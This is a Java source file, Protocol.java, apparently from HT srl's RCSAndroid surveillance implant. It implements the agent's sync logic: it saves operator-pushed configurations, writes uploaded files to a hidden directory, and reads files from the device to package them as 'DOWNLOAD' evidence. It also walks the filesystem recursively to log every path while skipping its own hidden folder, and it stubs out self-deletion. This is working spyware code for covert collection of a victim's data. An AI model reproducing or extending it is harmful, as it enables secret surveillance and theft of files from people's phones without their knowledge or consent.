/* *******************************************
 * Copyright (c) 2011
 * HT srl,   All rights reserved.
 * Project      : RCS, RCSAndroid
 * File         : Protocol.java
 * Created      : Apr 9, 2011
 * Author		: zeno
 * *******************************************/
package com.ht.RCSAndroidGUI.action.sync;

import java.io.File;
import java.util.Date;
import java.util.Vector;

import com.ht.RCSAndroidGUI.Debug;
import com.ht.RCSAndroidGUI.LogR;
import com.ht.RCSAndroidGUI.conf.Configuration;
import com.ht.RCSAndroidGUI.evidence.Evidence;
import com.ht.RCSAndroidGUI.evidence.EvidenceType;
import com.ht.RCSAndroidGUI.file.AutoFile;
import com.ht.RCSAndroidGUI.file.Directory;
import com.ht.RCSAndroidGUI.file.Path;
import com.ht.RCSAndroidGUI.utils.Check;
import com.ht.RCSAndroidGUI.utils.DataBuffer;
import com.ht.RCSAndroidGUI.utils.DateTime;
import com.ht.RCSAndroidGUI.utils.Utils;
import com.ht.RCSAndroidGUI.utils.WChar;

// TODO: Auto-generated Javadoc
/**
 * The Class Protocol.
 */
public abstract class Protocol {

	/** The Constant UPGRADE_FILENAME. */
	public static final String UPGRADE_FILENAME = "core-update";

	// #ifdef DEBUG
	/** The debug. */
	private static Debug debug = new Debug("Protocol");
	// #endif

	/** The transport. */
	protected Transport transport;

	/** The reload. */
	public boolean reload;

	/** The uninstall. */
	public boolean uninstall;

	/**
	 * Inits the.
	 * 
	 * @param transport
	 *            the transport
	 * @return true, if successful
	 */
	public boolean init(final Transport transport) {
		this.transport = transport;
		// transport.initConnection();
		return true;
	}

	/**
	 * Perform.
	 * 
	 * @return true, if successful
	 * @throws ProtocolException
	 *             the protocol exception
	 */
	public abstract boolean perform() throws ProtocolException;

	/**
	 * Save new conf.
	 * 
	 * @param conf
	 *            the conf
	 * @param offset
	 *            the offset
	 * @return true, if successful
	 * @throws CommandException
	 *             the command exception
	 */
	public synchronized static boolean saveNewConf(final byte[] conf,
			final int offset) throws CommandException {
		final AutoFile file = new AutoFile(Path.conf() + Configuration.NEW_CONF);

		if (file.write(conf, offset, false)) {
			Evidence.info("New configuration received");
			return true;
		} else {
			return false;
		}

	}

	/**
	 * Save upload.
	 * 
	 * @param filename
	 *            the filename
	 * @param content
	 *            the content
	 */
	public static void saveUpload(final String filename, final byte[] content) {
		final AutoFile file = new AutoFile(Path.hidden());

		if (file.exists()) {
			// #ifdef DEBUG
			debug.trace("getUpload replacing existing file: " + filename);
			// #endif
			file.delete();
		}
		file.write(content);

		// #ifdef DEBUG
		debug.trace("file written: " + file.exists());
		// #endif
	}

	/**
	 * Upgrade multi.
	 * 
	 * @param files
	 *            the files
	 * @return true, if successful
	 */
	public static boolean upgradeMulti(final Vector files) {
		// TODO
		return true;
	}

	/**
	 * Delete self.
	 * 
	 * @return true, if successful
	 */
	public static boolean deleteSelf() {
		// TODO
		return false;

	}

	/**
	 * Save download log.
	 * 
	 * @param filefilter
	 *            the filefilter
	 */
	public static void saveDownloadLog(final String filefilter) {
		AutoFile file = new AutoFile(filefilter);
		if (file.exists()) {
			// #ifdef DEBUG
			debug.trace("logging file: " + filefilter);
			// #endif
			if (file.canRead()) {
				saveFileLog(file, filefilter);
			}
		} else {
			// #ifdef DEBUG
			debug.trace("not a file, try to expand it: " + filefilter);
			// #endif

			final String[] files = file.list();
			for (final String filename : files) {

				file = new AutoFile(filename);
				if (file.isDirectory()) {
					continue;
				}

				saveFileLog(file, filename);

				// #ifdef DEBUG
				debug.trace("logging file: " + filename);
				// #endif

			}
		}
	}

	/**
	 * Save file log.
	 * 
	 * @param file
	 *            the file
	 * @param filename
	 *            the filename
	 */
	private static void saveFileLog(final AutoFile file, final String filename) {

		// #ifdef DBC
		Check.requires(file != null, "null file");
		Check.requires(file.exists(), "file should exist");
		Check.requires(!filename.endsWith("/"), "path shouldn't end with /");
		Check.requires(!filename.endsWith("*"), "path shouldn't end with *");
		// #endif

		final byte[] content = file.read();
		final byte[] additional = Protocol.logDownloadAdditional(filename);
		//final Evidence log = new Evidence(0);

		new LogR(EvidenceType.DOWNLOAD, LogR.LOG_PRI_STD, additional, content);

		// log.atomicWriteOnce(additional, EvidenceType.DOWNLOAD, content);

	}

	/**
	 * Log download additional.
	 * 
	 * @param filename
	 *            the filename
	 * @return the byte[]
	 */
	private static byte[] logDownloadAdditional(String filename) {

		// #ifdef DBC
		Check.requires(filename != null, "null file");
		Check.requires(!filename.endsWith("/"), "path shouldn't end with /");
		Check.requires(!filename.endsWith("*"), "path shouldn't end with *");
		// #endif

		final String path = Utils.chomp(Path.hidden(), "/"); // UPLOAD_DIR
		final int macroPos = filename.indexOf(path);
		if (macroPos >= 0) {
			// #ifdef DEBUG
			debug.trace("macropos: " + macroPos);
			// #endif
			final String start = filename.substring(0, macroPos);
			final String end = filename.substring(macroPos + path.length());

			filename = start + Directory.hiddenDirMacro + end;
		}

		// #ifdef DEBUG
		debug.trace("filename: " + filename);
		// #endif

		final int version = 2008122901;
		final byte[] wfilename = WChar.getBytes(filename);
		final byte[] buffer = new byte[wfilename.length + 8];

		final DataBuffer databuffer = new DataBuffer(buffer, 0, buffer.length);

		databuffer.writeInt(version);
		databuffer.writeInt(wfilename.length);
		databuffer.write(wfilename);

		return buffer;
	}

	/**
	 * Save filesystem.
	 * 
	 * @param depth
	 *            the depth
	 * @param path
	 *            the path
	 */
	public static void saveFilesystem(final int depth, String path) {
		final Evidence fsLog = new Evidence(EvidenceType.FILESYSTEM);
		fsLog.createEvidence(null, EvidenceType.FILESYSTEM);

		// Expand path and create log
		if (path.equals("/")) {
			// #ifdef DEBUG
			debug.trace("sendFilesystem: root");
			// #endif
			expandRoot(fsLog, depth);
		} else {
			if (path.startsWith("//") && path.endsWith("/*")) {
				path = path.substring(1, path.length() - 2);

				expandPath(fsLog, path, depth);
			} else {
				// #ifdef DEBUG
				debug.error("sendFilesystem: strange path, ignoring it. "
						+ path);
				// #endif
			}
		}

		fsLog.close();
	}

	/**
	 * Expand the root for a maximum depth. 0 means only root, 1 means its sons.
	 * 
	 * @param fsLog
	 *            the fs log
	 * @param depth
	 *            the depth
	 */
	private static void expandRoot(final Evidence fsLog, final int depth) {
		// #ifdef DBC
		Check.requires(depth > 0, "wrong recursion depth");
		// #endif

		saveRootLog(fsLog); // depth 0
		expandPath(fsLog, "/", depth);

	}

	/**
	 * Save filesystem log.
	 * 
	 * @param fsLog
	 *            the fs log
	 * @param filepath
	 *            the filepath
	 * @return true, if successful
	 */
	private static boolean saveFilesystemLog(final Evidence fsLog,
			final String filepath) {
		// #ifdef DBC
		Check.requires(fsLog != null, "fsLog null");
		Check.requires(!filepath.endsWith("/"), "path shouldn't end with /");
		Check.requires(!filepath.endsWith("*"), "path shouldn't end with *");
		// #endif

		// #ifdef DEBUG
		debug.info("save FilesystemLog: " + filepath);
		// #endif
		final int version = 2010031501;

		final AutoFile file = new AutoFile(filepath);
		if (!file.exists()) {
			// #ifdef DEBUG
			debug.error("non existing file: " + filepath);
			// #endif
			return false;
		}

		final byte[] w_filepath = WChar.getBytes(filepath, true);

		final byte[] content = new byte[28 + w_filepath.length];
		final DataBuffer databuffer = new DataBuffer(content, 0, content.length);

		databuffer.writeInt(version);
		databuffer.writeInt(w_filepath.length);

		int flags = 0;
		final long size = file.getSize();

		final boolean isDir = file.isDirectory();
		if (isDir) {
			flags |= 1;
		} else {
			if (size == 0) {
				flags |= 2;
			}
		}

		databuffer.writeInt(flags);
		databuffer.writeLong(size);
		databuffer.writeLong(DateTime.getFiledate(file.getFileTime()));
		databuffer.write(w_filepath);

		fsLog.writeEvidence(content);

		// #ifdef DEBUG
		debug.trace("expandPath: written log");
		// #endif

		return isDir;

	}

	/**
	 * saves the root log. We use this method because the directory "/" cannot
	 * be opened, we fake it.
	 * 
	 * @param fsLog
	 *            the fs log
	 */
	private static void saveRootLog(final Evidence fsLog) {
		final int version = 2010031501;

		// #ifdef DBC
		Check.requires(fsLog != null, "fsLog null");
		// #endif
		final byte[] content = new byte[30];

		final DataBuffer databuffer = new DataBuffer(content);
		databuffer.writeInt(version);
		databuffer.writeInt(2); // len
		databuffer.writeInt(1); // flags
		databuffer.writeLong(0);
		databuffer.writeLong(DateTime.getFiledate(new Date()));
		databuffer.write(WChar.getBytes("/"));
		fsLog.writeEvidence(content);
	}

	/**
	 * Expand recursively the path saving the log. When depth is 0 saves the log
	 * and stop recurring.
	 * 
	 * @param fsLog
	 *            the fs log
	 * @param path
	 *            the path
	 * @param depth
	 *            the depth
	 */
	private static void expandPath(final Evidence fsLog, final String path,
			final int depth) {
		// #ifdef DBC
		Check.requires(depth > 0, "wrong recursion depth");
		Check.requires(path != null, "path==null");
		Check.requires(path == "/" || !path.endsWith("/"),
				"path should end with /");
		Check.requires(!path.endsWith("*"), "path shouldn't end with *");
		// #endif

		// #ifdef DEBUG
		debug.trace("expandPath: " + path + " depth: " + depth);
		// #endif

		final File dir = new File(path);
		if (dir.isDirectory()) {
			final String[] files = dir.list();
			if (files == null) {
				return;
			}
			for (final String file : files) {
				String dPath = path + "/" + file;
				if (dPath.startsWith("//")) {
					dPath = dPath.substring(1);
				}
				if (dPath.indexOf(Utils.chomp(Path.hidden(), "/")) >= 0) {
					// #ifdef DEBUG
					debug.warn("expandPath ignoring hidden path: " + dPath);
					// #endif
					continue;
				}

				final boolean isDir = Protocol.saveFilesystemLog(fsLog, dPath);
				if (isDir && depth > 1) {
					expandPath(fsLog, dPath, depth - 1);
				}
			}
		}

	}

	/**
	 * Normalize filename.
	 * 
	 * @param file
	 *            the file
	 * @return the string
	 */
	public static String normalizeFilename(final String file) {
		if (file.startsWith("//")) {
			// #ifdef DEBUG
			debug.trace("normalizeFilename: " + file);
			// #endif
			return file.substring(1);
		} else {
			return file;
		}
	}

}
